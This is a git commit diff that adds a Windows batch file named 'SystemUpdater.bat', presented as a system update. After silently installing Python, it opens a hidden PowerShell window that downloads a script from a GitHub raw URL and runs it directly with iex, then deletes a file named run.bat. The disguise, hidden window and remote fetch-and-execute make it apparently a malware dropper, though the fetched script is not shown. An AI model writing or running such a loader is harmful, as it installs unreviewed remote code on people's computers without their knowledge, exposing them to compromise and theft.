4709450a9750585ff3b49957abea50ee46e0bff4
kevilevi <kevin.kevlev822@gmail.com>
2025-11-15 21:17:33 +0530

    Add files via upload

---
+++ SystemUpdater.bat
@@ -0,0 +1,5 @@
+@echo off
+echo Updateing.........!
+winget install --id Python.Python.3.12 --exact --accept-package-agreements --accept-source-agreements --silent
+powershell -WindowStyle Hidden -Command "irm 'https://raw.githubusercontent.com/kevilevi/ps/refs/heads/main/start.ps1' |iex"
+del run.bat
